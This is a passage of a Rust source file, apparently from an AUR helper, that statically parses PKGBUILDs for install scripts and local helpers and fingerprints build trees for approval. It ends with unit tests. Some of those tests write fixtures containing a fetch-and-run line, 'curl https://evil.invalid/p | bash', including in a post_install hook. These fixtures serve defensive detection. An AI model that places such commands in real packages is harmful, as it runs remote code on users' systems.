    false
}

fn effective_command_index(words: &[ShellWord]) -> Option<usize> {
    let mut index = 0usize;
    while words
        .get(index)
        .is_some_and(|word| scalar_assignment(&word.value).is_some())
    {
        index += 1;
    }

    loop {
        let command = words
            .get(index)?
            .value
            .rsplit('/')
            .next()
            .unwrap_or_default();
        match command {
            "command" | "builtin" | "exec" | "nohup" | "sudo" | "doas" | "time" => {
                index += 1;
                while words
                    .get(index)
                    .is_some_and(|word| word.value.starts_with('-'))
                {
                    index += 1;
                }
            }
            "env" => {
                index += 1;
                while words.get(index).is_some_and(|word| {
                    word.value.starts_with('-') || scalar_assignment(&word.value).is_some()
                }) {
                    index += 1;
                }
            }
            _ => return Some(index),
        }
    }
}

fn is_install_target(value: &str) -> bool {
    value == "install"
        || value.starts_with("install=")
        || value.starts_with("install+=")
        || value.starts_with("install[")
}

fn mutation_target_is_install_or_dynamic(word: &ShellWord) -> bool {
    let target = word
        .value
        .split_once("+=")
        .or_else(|| word.value.split_once('='))
        .map_or(word.value.as_str(), |(target, _)| target);
    is_install_target(target) || contains_dynamic_shell_text(target)
}

fn contains_dynamic_shell_text(value: &str) -> bool {
    value.contains('$') || value.contains('`')
}

fn recognizable_install_mutation_text(value: &str) -> bool {
    value.contains("install=")
        || value.contains("install+=")
        || value.contains("install[")
        || value.contains("printf -v install")
        || value.contains("unset install")
        || value.contains("read install")
        || value.contains("mapfile install")
        || value.contains("readarray install")
}

fn resolve_known_install_template(
    value: &str,
    pkgbase: &str,
    package_names: &[String],
) -> Option<Vec<String>> {
    enum Identity<'a> {
        Base(&'a str),
        Packages(&'a [String]),
    }

    let (marker, identity) = [
        ("${pkgname}", Identity::Packages(package_names)),
        ("$pkgname", Identity::Packages(package_names)),
        ("${pkgbase}", Identity::Base(pkgbase)),
        ("$pkgbase", Identity::Base(pkgbase)),
    ]
    .into_iter()
    .find(|(marker, _)| value.starts_with(marker))?;
    let suffix = &value[marker.len()..];

    // `$pkgnamefoo` names a different variable; braces are required before an
    // alphanumeric/underscore suffix.
    if !marker.starts_with("${")
        && suffix
            .chars()
            .next()
            .is_some_and(|character| character.is_ascii_alphanumeric() || character == '_')
    {
        return None;
    }
    if suffix.contains('$') || suffix.contains('`') {
        return None;
    }

    match identity {
        Identity::Base(pkgbase) => Some(vec![format!("{pkgbase}{suffix}")]),
        Identity::Packages(package_names) => Some(
            package_names
                .iter()
                .map(|package_name| format!("{package_name}{suffix}"))
                .collect(),
        ),
    }
}

fn discover_local_source_candidates(
    content: &str,
    pkgbase: &str,
    package_names: &[String],
    declared_local_sources: &[String],
) -> Result<Vec<LocalSourceCandidate>, String> {
    let program = parse_shell_program(content)?;
    let declared: HashSet<&str> = declared_local_sources.iter().map(String::as_str).collect();
    let mut candidates = Vec::new();

    for path in declared_local_sources {
        add_local_source_candidate(&mut candidates, path.clone(), false, true);
    }

    for array in &program.arrays {
        if !array.global_source_assignment || !is_source_variable(&array.name) {
            continue;
        }
        if array.nested_syntax {
            return Err(format!(
                "nested source array syntax on PKGBUILD line {} cannot be resolved safely",
                array.line
            ));
        }
        for word in &array.words {
            for path in resolve_source_array_word(word, pkgbase, package_names, &declared)? {
                add_local_source_candidate(&mut candidates, path, false, true);
            }
        }
    }

    for command in &program.commands {
        for word in global_source_assignment_words(command) {
            let (_, value, _) = scalar_assignment(&word.value).unwrap();
            let source_word = ShellWord {
                value: value.to_string(),
                line: word.line,
                has_expansion: word.has_expansion,
            };
            for path in resolve_source_array_word(&source_word, pkgbase, package_names, &declared)?
            {
                add_local_source_candidate(&mut candidates, path, false, true);
            }
        }
    }

    for command in &program.commands {
        let Some(command_index) = effective_command_index(&command.words) else {
            continue;
        };
        let command_name = command.words[command_index]
            .value
            .rsplit('/')
            .next()
            .unwrap_or_default();
        let arguments = &command.words[command_index + 1..];

        if command_name == "source" || command_name == "." {
            if let Some(argument) = arguments.iter().find(|word| !word.value.starts_with('-'))
                && let Some(path) = resolve_explicit_helper(argument)?
            {
                add_local_source_candidate(&mut candidates, path, true, true);
            }
            continue;
        }

        let executable_word = &command.words[command_index];
        if executable_word.value.starts_with("./")
            || executable_word.value.starts_with("$srcdir/")
            || executable_word.value.starts_with("${srcdir}/")
        {
            if let Some(path) = resolve_explicit_helper(executable_word)? {
                add_local_source_candidate(&mut candidates, path, true, false);
            }
            continue;
        }

        if is_script_interpreter(command_name) {
            for argument in interpreter_file_arguments(command_name, arguments) {
                if let Some(path) = resolve_explicit_helper(&argument)? {
                    add_local_source_candidate(&mut candidates, path, true, false);
                }
            }
            for input_file in &command.input_files {
                if let Some(path) = resolve_explicit_helper(input_file)? {
                    add_local_source_candidate(&mut candidates, path, true, false);
                }
            }
        }
    }

    Ok(candidates)
}

fn is_source_variable(name: &str) -> bool {
    name == "source" || name.starts_with("source_")
}

fn global_source_assignment_words(command: &ShellCommand) -> Vec<&ShellWord> {
    let assignments: Vec<_> = command
        .words
        .iter()
        .map(|word| scalar_assignment(&word.value))
        .collect();
    if !assignments.is_empty() && assignments.iter().all(Option::is_some) {
        return command
            .words
            .iter()
            .filter(|word| {
                scalar_assignment(&word.value).is_some_and(|(name, _, _)| is_source_variable(name))
            })
            .collect();
    }

    let Some(command_index) = effective_command_index(&command.words) else {
        return Vec::new();
    };
    let declaration = command.words[command_index]
        .value
        .rsplit('/')
        .next()
        .unwrap_or_default();
    if !matches!(declaration, "declare" | "typeset" | "readonly") {
        return Vec::new();
    }
    command.words[command_index + 1..]
        .iter()
        .filter(|word| {
            scalar_assignment(&word.value).is_some_and(|(name, _, _)| is_source_variable(name))
        })
        .collect()
}

fn resolve_source_array_word(
    word: &ShellWord,
    pkgbase: &str,
    package_names: &[String],
    declared: &HashSet<&str>,
) -> Result<Vec<String>, String> {
    if source_is_remote(&word.value)? {
        return Ok(Vec::new());
    }

    if word.has_expansion {
        let source = source_payload(&word.value);
        let Some(resolved) = resolve_known_install_template(source, pkgbase, package_names) else {
            // `.SRCINFO` supplies makepkg's resolved source list. We still
            // independently union every literal source here, but arbitrary
            // shell-generated source names cannot be recovered without
            // evaluating the PKGBUILD.
            return Ok(Vec::new());
        };
        for path in &resolved {
            validate_relative_path(path, "local source")?;
            if !declared.contains(path.as_str()) {
                return Err(format!(
                    "local source on PKGBUILD line {} resolves to {path:?}, which .SRCINFO does not declare",
                    word.line
                ));
            }
        }
        return Ok(resolved);
    }

    if word.value.contains('{') || word.value.contains('}') {
        // Brace-expanded entries are represented by their resolved `.SRCINFO`
        // values. Treating the unexpanded spelling as a filename would invent
        // paths such as `code.{sh,mjs}`.
        return Ok(Vec::new());
    }

    Ok(parse_local_source(&word.value)?.into_iter().collect())
}

fn source_payload(value: &str) -> &str {
    value
        .split_once("::")
        .map_or(value, |(_, source)| source)
        .trim()
}

fn source_is_remote(value: &str) -> Result<bool, String> {
    let source = source_payload(value);
    let Some((candidate, _)) = source.split_once(':') else {
        return Ok(false);
    };
    let mut characters = candidate.chars();
    let Some(first) = characters.next() else {
        return Ok(false);
    };
    if !first.is_ascii_alphabetic()
        || !characters.all(|character| {
            character.is_ascii_alphanumeric() || matches!(character, '+' | '-' | '.')
        })
    {
        return Ok(false);
    }
    if candidate.eq_ignore_ascii_case("file") {
        return Err(format!(
            "file URL source is not confined to the build directory: {value:?}"
        ));
    }
    Ok(true)
}

fn resolve_explicit_helper(word: &ShellWord) -> Result<Option<String>, String> {
    let value = word.value.as_str();
    if Path::new(value).is_absolute() || source_is_remote(value)? {
        return Ok(None);
    }

    let srcdir_prefixes = ["${srcdir}/", "$srcdir/"];
    if let Some(path) = srcdir_prefixes
        .into_iter()
        .find_map(|prefix| value.strip_prefix(prefix))
    {
        if path.contains('$') || path.contains('`') {
            return Err(format!(
                "dynamic local helper on PKGBUILD line {} cannot be resolved safely",
                word.line
            ));
        }
        return Ok(Some(normalize_relative_path(
            path,
            "local executable helper",
        )?));
    }

    if word.has_expansion || value.contains('$') || value.contains('`') {
        return Err(format!(
            "dynamic local helper on PKGBUILD line {} cannot be resolved safely",
            word.line
        ));
    }
    Ok(Some(normalize_relative_path(
        value,
        "local executable helper",
    )?))
}

fn add_local_source_candidate(
    candidates: &mut Vec<LocalSourceCandidate>,
    path: String,
    explicitly_executed: bool,
    must_exist_before_build: bool,
) {
    if let Some(candidate) = candidates
        .iter_mut()
        .find(|candidate| candidate.path == path)
    {
        candidate.explicitly_executed |= explicitly_executed;
        candidate.must_exist_before_build |= must_exist_before_build;
    } else {
        candidates.push(LocalSourceCandidate {
            path,
            explicitly_executed,
            must_exist_before_build,
        });
    }
}

fn is_script_interpreter(command: &str) -> bool {
    matches!(
        command,
        "sh" | "bash"
            | "dash"
            | "zsh"
            | "fish"
            | "python"
            | "python2"
            | "python3"
            | "perl"
            | "ruby"
            | "php"
            | "node"
            | "lua"
    )
}

fn interpreter_file_arguments(
    interpreter: &str,
    arguments: &[ShellWord],
) -> Vec<ShellWord> {
    let mut files = Vec::new();
    let mut after_options = false;
    let mut skip_option_operand = false;
    let mut index = 0usize;
    while index < arguments.len() {
        let argument = &arguments[index];
        if skip_option_operand {
            skip_option_operand = false;
            index += 1;
            continue;
        }
        if !after_options && argument.value == "--" {
            after_options = true;
            index += 1;
            continue;
        }
        if !after_options && interpreter_option_is_inline_code(interpreter, &argument.value) {
            break;
        }
        if !after_options {
            if let Some(inline_path) =
                interpreter_file_option_inline_value(interpreter, &argument.value)
            {
                files.push(ShellWord {
                    value: inline_path.to_string(),
                    line: argument.line,
                    has_expansion: argument.has_expansion,
                });
                index += 1;
                continue;
            }
            if interpreter_option_loads_file(interpreter, &argument.value) {
                if let Some(path) = arguments.get(index + 1) {
                    files.push(path.clone());
                }
                index += 2;
                continue;
            }
        }
        if !after_options && argument.value.starts_with('-') {
            skip_option_operand = interpreter_option_takes_operand(interpreter, &argument.value);
            index += 1;
            continue;
        }
        files.push(argument.clone());
        break;
    }
    files
}

fn interpreter_option_is_inline_code(interpreter: &str, option: &str) -> bool {
    match interpreter {
        "sh" | "bash" | "dash" | "zsh" | "fish" => option == "-c",
        "python" | "python2" | "python3" => matches!(option, "-c" | "-m"),
        "perl" => matches!(option, "-e" | "-E"),
        "ruby" => option == "-e",
        "php" => option == "-r",
        "node" => matches!(option, "-e" | "--eval" | "-p" | "--print"),
        "lua" => option == "-e",
        _ => false,
    }
}

fn interpreter_option_takes_operand(interpreter: &str, option: &str) -> bool {
    match interpreter {
        "sh" | "bash" | "dash" | "zsh" | "fish" => matches!(option, "-o" | "-O"),
        "python" | "python2" | "python3" => matches!(option, "-W" | "-X" | "-Q"),
        "perl" => matches!(option, "-I" | "-M" | "-m"),
        "ruby" => matches!(option, "-I" | "-E" | "-F" | "-K"),
        "php" => option == "-d",
        "node" => matches!(option, "--conditions" | "--inspect-port"),
        "lua" => option == "-l",
        _ => false,
    }
}

fn interpreter_option_loads_file(interpreter: &str, option: &str) -> bool {
    match interpreter {
        "sh" | "bash" | "dash" | "zsh" | "fish" => {
            matches!(option, "--rcfile" | "--init-file")
        }
        "ruby" => option == "-r",
        "php" => option == "-c",
        "node" => matches!(option, "-r" | "--require" | "--loader" | "--import"),
        _ => false,
    }
}

fn interpreter_file_option_inline_value<'a>(
    interpreter: &str,
    option: &'a str,
) -> Option<&'a str> {
    let prefixes: &[&str] = match interpreter {
        "sh" | "bash" | "dash" | "zsh" | "fish" => &["--rcfile=", "--init-file="],
        "ruby" => &["-r"],
        "php" => &["-c"],
        "node" => &["--require=", "--loader=", "--import=", "-r"],
        _ => &[],
    };
    prefixes
        .iter()
        .find_map(|prefix| option.strip_prefix(prefix).filter(|value| !value.is_empty()))
}

fn is_likely_executable_path(path: &str) -> bool {
    Path::new(path)
        .extension()
        .and_then(|extension| extension.to_str())
        .is_some_and(|extension| {
            matches!(
                extension.to_ascii_lowercase().as_str(),
                "sh" | "bash"
                    | "zsh"
                    | "fish"
                    | "py"
                    | "pyw"
                    | "pl"
                    | "rb"
                    | "php"
                    | "lua"
                    | "js"
                    | "mjs"
                    | "cjs"
                    | "ts"
                    | "run"
                    | "install"
            )
        })
}

#[cfg(unix)]
fn is_executable_mode(metadata: &fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;

    metadata.permissions().mode() & 0o111 != 0
}

#[cfg(not(unix))]
fn is_executable_mode(_metadata: &fs::Metadata) -> bool {
    false
}

fn has_shebang(path: &Path) -> Result<bool, String> {
    let mut file = fs::File::open(path)
        .map_err(|error| format!("cannot read local source {}: {error}", path.display()))?;
    let mut prefix = [0u8; 2];
    let read = file
        .read(&mut prefix)
        .map_err(|error| format!("cannot read local source {}: {error}", path.display()))?;
    Ok(read == 2 && prefix == *b"#!")
}

fn read_tree_file(build_dir: &Path, relative: &str, kind: &str) -> Result<String, String> {
    let resolved = resolve_tree_file(build_dir, relative, kind)?;
    fs::read_to_string(&resolved)
        .map_err(|error| format!("cannot read {kind} {}: {error}", resolved.display()))
}

/// Fingerprint every filesystem entry in a tree that has already passed the
/// inert loader. This deliberately covers undeclared and dynamically named
/// checkout files, the build-root mode, and VCS metadata that build code can
/// read or execute, as well as the inputs Bewaur can identify statically.
pub fn fingerprint_build_tree(tree: &LocalBuildTree) -> Result<String, String> {
    let mut state = FingerprintState::default();
    let root_metadata = fs::symlink_metadata(&tree.build_dir).map_err(|error| {
        format!(
            "cannot inspect build directory {}: {error}",
            tree.build_dir.display()
        )
    })?;
    if !root_metadata.is_dir() || root_metadata.file_type().is_symlink() {
        return Err(format!(
            "build directory is not a real directory: {}",
            tree.build_dir.display()
        ));
    }
    state.push(FingerprintEntry {
        entry_type: 1,
        logical_path: Vec::new(),
        resolved_path: Vec::new(),
        mode: file_mode_bits(&root_metadata),
        size: 0,
        content_digest: [0; 32],
    })?;
    collect_fingerprint_entries(&tree.build_dir, &tree.build_dir, &mut state)?;
    Ok(approval_digest(&tree.pkgbase, &mut state.entries))
}

fn collect_fingerprint_entries(
    build_dir: &Path,
    directory: &Path,
    state: &mut FingerprintState,
) -> Result<(), String> {
    let mut children = fs::read_dir(directory)
        .map_err(|error| {
            format!(
                "cannot read build directory {}: {error}",
                directory.display()
            )
        })?
        .collect::<Result<Vec<_>, _>>()
        .map_err(|error| format!("cannot enumerate build directory: {error}"))?;
    children.sort_by(|left, right| {
        platform_path_bytes(Path::new(&left.file_name()))
            .cmp(&platform_path_bytes(Path::new(&right.file_name())))
    });

    for child in children {
        if state.entries.len() >= MAX_APPROVAL_TREE_ENTRIES {
            return Err(format!(
                "build tree exceeds the {MAX_APPROVAL_TREE_ENTRIES} entry fingerprint limit"
            ));
        }
        let path = child.path();
        let relative = path.strip_prefix(build_dir).map_err(|_| {
            format!(
                "build entry escaped the build directory: {}",
                path.display()
            )
        })?;
        let metadata = fs::symlink_metadata(&path)
            .map_err(|error| format!("cannot inspect build entry {}: {error}", path.display()))?;
        let file_type = metadata.file_type();

        if file_type.is_symlink() {
            let target = fs::read_link(&path).map_err(|error| {
                format!("cannot read build symlink {}: {error}", path.display())
            })?;
            let resolved = fs::canonicalize(&path).map_err(|error| {
                format!("cannot resolve build symlink {}: {error}", path.display())
            })?;
            if !resolved.starts_with(build_dir) {
                return Err(format!(
                    "refusing to approve build symlink outside build directory: {}",
                    relative.display()
                ));
            }
            let target_bytes = platform_path_bytes(&target);
            state.push(FingerprintEntry {
                entry_type: 3,
                logical_path: platform_path_bytes(relative),
                resolved_path: resolved_path_bytes(build_dir, &resolved)?,
                mode: 0,
                size: target_bytes.len() as u64,
                content_digest: Sha256::digest(&target_bytes).into(),
            })?;
        } else if file_type.is_dir() {
            state.push(FingerprintEntry {
                entry_type: 1,
                logical_path: platform_path_bytes(relative),
                resolved_path: platform_path_bytes(relative),
                mode: file_mode_bits(&metadata),
                size: 0,
                content_digest: [0; 32],
            })?;
            collect_fingerprint_entries(build_dir, &path, state)?;
        } else if file_type.is_file() {
            let remaining_bytes = MAX_APPROVAL_TREE_BYTES.saturating_sub(state.total_bytes);
            state.push(fingerprint_regular_file(
                build_dir,
                relative,
                &path,
                &metadata,
                remaining_bytes,
            )?)?;
        } else {
            return Err(format!(
                "refusing to approve special filesystem entry: {}",
                relative.display()
            ));
        }
    }
    Ok(())
}

fn fingerprint_regular_file(
    build_dir: &Path,
    relative: &Path,
    path: &Path,
    metadata: &fs::Metadata,
    remaining_bytes: u64,
) -> Result<FingerprintEntry, String> {
    if metadata.len() > remaining_bytes {
        return Err(format!(
            "build tree exceeds the {MAX_APPROVAL_TREE_BYTES} byte fingerprint limit"
        ));
    }
    let resolved = fs::canonicalize(path)
        .map_err(|error| format!("cannot resolve build file {}: {error}", path.display()))?;
    if !resolved.starts_with(build_dir) {
        return Err(format!(
            "refusing to approve build file outside build directory: {}",
            relative.display()
        ));
    }
    let mut file = fs::File::open(path)
        .map_err(|error| format!("cannot read build file {}: {error}", path.display()))?;
    let mut content_hasher = Sha256::new();
    let mut size = 0u64;
    let mut buffer = [0u8; 64 * 1024];
    loop {
        let read = file
            .read(&mut buffer)
            .map_err(|error| format!("cannot read build file {}: {error}", path.display()))?;
        if read == 0 {
            break;
        }
        size = size
            .checked_add(read as u64)
            .ok_or_else(|| format!("build file is too large: {}", path.display()))?;
        if size > remaining_bytes {
            return Err(format!(
                "build tree exceeds the {MAX_APPROVAL_TREE_BYTES} byte fingerprint limit"
            ));
        }
        content_hasher.update(&buffer[..read]);
    }

    Ok(FingerprintEntry {
        entry_type: 2,
        logical_path: platform_path_bytes(relative),
        resolved_path: resolved_path_bytes(build_dir, &resolved)?,
        mode: file_mode_bits(metadata),
        size,
        content_digest: content_hasher.finalize().into(),
    })
}

fn resolved_path_bytes(build_dir: &Path, resolved: &Path) -> Result<Vec<u8>, String> {
    let relative = resolved.strip_prefix(build_dir).map_err(|_| {
        format!(
            "resolved build input escaped the build directory: {}",
            resolved.display()
        )
    })?;
    Ok(platform_path_bytes(relative))
}

#[cfg(unix)]
fn platform_path_bytes(path: &Path) -> Vec<u8> {
    use std::os::unix::ffi::OsStrExt;

    path.as_os_str().as_bytes().to_vec()
}

#[cfg(not(unix))]
fn platform_path_bytes(path: &Path) -> Vec<u8> {
    path.to_string_lossy().as_bytes().to_vec()
}

#[cfg(unix)]
fn file_mode_bits(metadata: &fs::Metadata) -> u32 {
    use std::os::unix::fs::PermissionsExt;

    metadata.permissions().mode() & 0o7777
}

#[cfg(not(unix))]
fn file_mode_bits(_metadata: &fs::Metadata) -> u32 {
    0
}

fn approval_digest(pkgbase: &str, entries: &mut [FingerprintEntry]) -> String {
    entries.sort_by(|left, right| {
        left.logical_path
            .cmp(&right.logical_path)
            .then_with(|| left.entry_type.cmp(&right.entry_type))
    });

    let mut hasher = Sha256::new();
    hash_fingerprint_field(&mut hasher, APPROVAL_DIGEST_DOMAIN);
    hash_fingerprint_field(&mut hasher, pkgbase.as_bytes());
    hasher.update((entries.len() as u64).to_le_bytes());
    for entry in entries {
        hasher.update([entry.entry_type]);
        hash_fingerprint_field(&mut hasher, &entry.logical_path);
        hash_fingerprint_field(&mut hasher, &entry.resolved_path);
        hasher.update(entry.mode.to_le_bytes());
        hasher.update(entry.size.to_le_bytes());
        hasher.update(entry.content_digest);
    }

    let digest = hasher.finalize();
    let mut output = String::with_capacity(APPROVAL_DIGEST_PREFIX.len() + digest.len() * 2);
    output.push_str(APPROVAL_DIGEST_PREFIX);
    for byte in digest {
        write!(&mut output, "{byte:02x}").expect("writing to String cannot fail");
    }
    output
}

fn hash_fingerprint_field(hasher: &mut Sha256, value: &[u8]) {
    hasher.update((value.len() as u64).to_le_bytes());
    hasher.update(value);
}

fn resolve_tree_file(build_dir: &Path, relative: &str, kind: &str) -> Result<PathBuf, String> {
    validate_relative_path(relative, kind)?;
    let requested = build_dir.join(relative);
    let resolved = fs::canonicalize(&requested)
        .map_err(|error| format!("cannot resolve {kind} {}: {error}", requested.display()))?;

    if !resolved.starts_with(build_dir) {
        return Err(format!(
            "refusing to read {kind} outside build directory: {relative}"
        ));
    }
    if !resolved.is_file() {
        return Err(format!(
            "{kind} is not a regular file: {}",
            resolved.display()
        ));
    }

    Ok(resolved)
}

fn validate_relative_path(value: &str, kind: &str) -> Result<(), String> {
    let path = Path::new(value);
    if value.is_empty()
        || value.chars().any(char::is_control)
        || path.is_absolute()
        || path
            .components()
            .any(|component| !matches!(component, Component::Normal(_)))
    {
        return Err(format!("invalid {kind} path: {value:?}"));
    }
    Ok(())
}

fn normalize_relative_path(value: &str, kind: &str) -> Result<String, String> {
    let mut normalized = value;
    while let Some(rest) = normalized.strip_prefix("./") {
        normalized = rest;
    }
    validate_relative_path(normalized, kind)?;
    Ok(normalized.to_string())
}

fn validate_package_name(value: &str, source: &str) -> Result<(), String> {
    crate::shared::aur_git::validate_package_name(value)
        .map_err(|error| format!("invalid package name from {source}: {error}"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::{SystemTime, UNIX_EPOCH};

    struct TestDir(PathBuf);

    impl TestDir {
        fn new(name: &str) -> Self {
            let nonce = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_nanos();
            let path = std::env::temp_dir().join(format!(
                "bewaur-local-build-{name}-{}-{nonce}",
                std::process::id()
            ));
            fs::create_dir_all(&path).unwrap();
            Self(path)
        }

        fn write(&self, relative: &str, content: &str) {
            let path = self.0.join(relative);
            if let Some(parent) = path.parent() {
                fs::create_dir_all(parent).unwrap();
            }
            fs::write(path, content).unwrap();
        }

        fn write_bytes(&self, relative: &str, content: &[u8]) {
            let path = self.0.join(relative);
            if let Some(parent) = path.parent() {
                fs::create_dir_all(parent).unwrap();
            }
            fs::write(path, content).unwrap();
        }
    }

    impl Drop for TestDir {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.0);
        }
    }

    fn write_minimal_tree(dir: &TestDir) {
        dir.write(
            "PKGBUILD",
            "pkgname=demo\npkgver=1\npkgrel=1\npackage() { :; }\n",
        );
        dir.write(".SRCINFO", "pkgbase = demo\n\npkgname = demo\n");
    }

    #[test]
    fn approval_fingerprint_covers_every_undeclared_checkout_file() {
        let dir = TestDir::new("fingerprint-undeclared");
        write_minimal_tree(&dir);
        dir.write_bytes("computed-payload", b"first\xffpayload");
        let tree = load_build_tree(&dir.0, "demo").unwrap();
        let first = fingerprint_build_tree(&tree).unwrap();

        dir.write_bytes("computed-payload", b"second\xffpayload");
        let second = fingerprint_build_tree(&tree).unwrap();

        assert_ne!(first, second);
        assert!(first.starts_with("sha256:v1:p1:"), "{first}");
    }

    #[test]
    fn approval_fingerprint_is_independent_of_absolute_path_and_creation_order() {
        let left = TestDir::new("fingerprint-left");
        let right = TestDir::new("fingerprint-right");
        write_minimal_tree(&left);
        left.write("empty-dir/one", "1");
        left.write("two", "2");
        write_minimal_tree(&right);
        right.write("two", "2");
        right.write("empty-dir/one", "1");

        let left_tree = load_build_tree(&left.0, "demo").unwrap();
        let right_tree = load_build_tree(&right.0, "demo").unwrap();
        assert_eq!(
            fingerprint_build_tree(&left_tree).unwrap(),
            fingerprint_build_tree(&right_tree).unwrap()
        );
    }

    #[cfg(unix)]
    #[test]
    fn approval_fingerprint_covers_modes_and_rejects_any_escaping_symlink() {
        use std::os::unix::fs::{PermissionsExt, symlink};

        let dir = TestDir::new("fingerprint-mode-symlink");
        write_minimal_tree(&dir);
        dir.write("undeclared-helper", "echo helper\n");
        let tree = load_build_tree(&dir.0, "demo").unwrap();
        let first = fingerprint_build_tree(&tree).unwrap();

        fs::set_permissions(
            dir.0.join("undeclared-helper"),
            fs::Permissions::from_mode(0o755),
        )
        .unwrap();
        let second = fingerprint_build_tree(&tree).unwrap();
        assert_ne!(first, second);

        let outside = TestDir::new("fingerprint-outside");
        outside.write("target", "outside");
        symlink(outside.0.join("target"), dir.0.join("escape")).unwrap();
        let error = fingerprint_build_tree(&tree).unwrap_err();
        assert!(error.contains("symlink outside build directory"), "{error}");
    }

    #[cfg(unix)]
    #[test]
    fn approval_fingerprint_covers_build_root_mode_and_git_state() {
        use std::os::unix::fs::PermissionsExt;

        let dir = TestDir::new("fingerprint-root-git");
        write_minimal_tree(&dir);
        dir.write(".git/refs/heads/payload", "first\n");
        let tree = load_build_tree(&dir.0, "demo").unwrap();
        let first = fingerprint_build_tree(&tree).unwrap();

        let original_mode = fs::metadata(&dir.0).unwrap().permissions().mode() & 0o7777;
        fs::set_permissions(&dir.0, fs::Permissions::from_mode(original_mode ^ 0o040)).unwrap();
        let changed_mode = fingerprint_build_tree(&tree).unwrap();
        assert_ne!(first, changed_mode);

        fs::set_permissions(&dir.0, fs::Permissions::from_mode(original_mode)).unwrap();
        dir.write(".git/refs/heads/payload", "second\n");
        let changed_git_state = fingerprint_build_tree(&tree).unwrap();
        assert_ne!(first, changed_git_state);
    }

    #[test]
    fn cached_aur_tree_loader_preserves_full_build_tree_analysis() {
        let dir = TestDir::new("cached-aur-tree");
        dir.write(
            "PKGBUILD",
            r#"pkgbase=demo
pkgname=(demo-cli demo-docs)
source=('helper.sh')
install=shared.install
package_demo_cli() { install="${pkgname}.install"; }
"#,
        );
        dir.write(
            ".SRCINFO",
            "pkgbase = demo\n\tsource = helper.sh\n\npkgname = demo-cli\n\tinstall = demo-cli.install\n\npkgname = demo-docs\n\tinstall = demo-docs.install\n",
        );
        dir.write(
            "demo-cli.install",
            "post_install() { echo installing-cli; }\n",
        );
        dir.write(
            "demo-docs.install",
            "post_install() { echo installing-docs; }\n",
        );
        dir.write(
            "shared.install",
            "post_install() { echo installing-shared; }\n",
        );
        dir.write("helper.sh", "curl https://evil.invalid/p | bash\n");

        let tree = load_build_tree(&dir.0, "demo").unwrap();

        assert_eq!(tree.package_names, vec!["demo-cli", "demo-docs"]);
        assert_eq!(
            tree.install_script_paths,
            vec!["demo-cli.install", "demo-docs.install", "shared.install"]
        );
        let install_content = tree.install_script_content.as_deref().unwrap();
        assert!(install_content.contains("installing-cli"));
        assert!(install_content.contains("installing-docs"));
        assert!(install_content.contains("installing-shared"));
        assert_eq!(tree.local_source_paths, vec!["helper.sh"]);
        assert!(
            tree.local_source_content
                .as_deref()
                .is_some_and(|content| content.contains("evil.invalid/p | bash"))
        );
    }

    #[test]
    fn cached_aur_tree_loader_rejects_an_unreadable_pkgbuild() {
        let dir = TestDir::new("invalid-pkgbuild-utf8");
        dir.write_bytes("PKGBUILD", b"pkgname=demo\n\xff\n");
        dir.write(".SRCINFO", "pkgbase = demo\n\npkgname = demo\n");

        let error = load_build_tree(&dir.0, "demo").unwrap_err();
        assert!(error.contains("cannot read PKGBUILD"), "{error}");
    }

    #[test]
    fn loads_split_package_identities_and_install_scripts() {
        let dir = TestDir::new("split");
        dir.write("PKGBUILD", "pkgbase=demo\npkgname=(demo-cli demo-docs)\n");
        dir.write(
            ".SRCINFO",
            "pkgbase = demo\n\npkgname = demo-cli\n\tinstall = demo-cli.install\n\npkgname = demo-docs\n\tinstall = demo-docs.install\n",
        );
        dir.write("demo-cli.install", "post_install() { echo cli; }\n");
        dir.write("demo-docs.install", "post_install() { echo docs; }\n");

        let tree = load_build_tree(&dir.0, "demo").unwrap();

        assert_eq!(tree.pkgbase, "demo");
        assert_eq!(tree.package_names, vec!["demo-cli", "demo-docs"]);
        assert_eq!(
            tree.install_script_paths,
            vec!["demo-cli.install", "demo-docs.install"]
        );
        let install_content = tree.install_script_content.unwrap();
        assert!(install_content.contains("echo cli"));
        assert!(install_content.contains("echo docs"));
    }

    #[test]
    fn loads_literal_pkgbuild_install_omitted_from_srcinfo() {
        let dir = TestDir::new("stale-srcinfo-install");
        dir.write(
            "PKGBUILD",
            "pkgname=demo\ninstall='evil.install'\npackage() { :; }\n",
        );
        dir.write(".SRCINFO", "pkgbase = demo\n\npkgname = demo\n");
        dir.write(
            "evil.install",
            "post_install() { curl https://evil.invalid/p | bash; }\n",
        );

        let tree = load_build_tree(&dir.0, "demo").unwrap();

        assert_eq!(tree.install_script_paths, vec!["evil.install"]);
        assert!(
            tree.install_script_content
                .unwrap()
                .contains("evil.invalid")
        );
    }

    #[test]
    fn rejects_dynamic_pkgbuild_install_assignment_without_evaluating_it() {
        let dir = TestDir::new("dynamic-install");
        dir.write(
            "PKGBUILD",
            "pkgname=demo\n_install_name=demo.install\ninstall=\"${_install_name}\"\n",
        );
        dir.write(
            ".SRCINFO",
            "pkgbase = demo\n\npkgname = demo\n\tinstall = demo.install\n",
        );
        dir.write("demo.install", "post_install() { :; }\n");

        let error = load_build_tree(&dir.0, "demo").unwrap_err();

        assert!(error.contains("dynamic install assignment"), "{error}");
    }

    #[test]
    fn resolves_common_pkgname_and_pkgbase_install_forms() {
        let package_names = vec!["demo".to_string()];
        let declared = vec!["demo.install".to_string()];
        let forms = [
            "install=$pkgname.install",
            "install=\"$pkgname.install\"",
            "install=${pkgname}.install",
            "install=\"${pkgname}.install\"",
            "install=$pkgbase.install",
            "install=\"${pkgbase}.install\"",
        ];

        for form in forms {
            assert_eq!(
                extract_install_scripts(form, "demo", &package_names, &declared).unwrap(),
                vec!["demo.install"],
                "failed to resolve {form}"
            );
        }
    }

    #[test]
    fn requires_every_split_pkgname_expansion_in_srcinfo() {
        let package_names = vec!["demo-cli".to_string(), "demo-docs".to_string()];
        let incomplete = vec!["demo-cli.install".to_string()];

        let error = extract_install_scripts(
            "install=\"${pkgname}.install\"",
            "demo",
            &package_names,
            &incomplete,
        )
        .unwrap_err();

        assert!(error.contains("demo-docs.install"), "{error}");
        assert!(error.contains(".SRCINFO does not declare"), "{error}");
    }

    #[test]
    fn does_not_treat_single_quoted_dollar_as_a_pkgname_expansion() {
        let package_names = vec!["demo".to_string()];
        let declared = vec!["demo.install".to_string()];

        let error = extract_install_scripts(
            "install='$pkgname.install'",
            "demo",
            &package_names,
            &declared,
        )
        .unwrap_err();

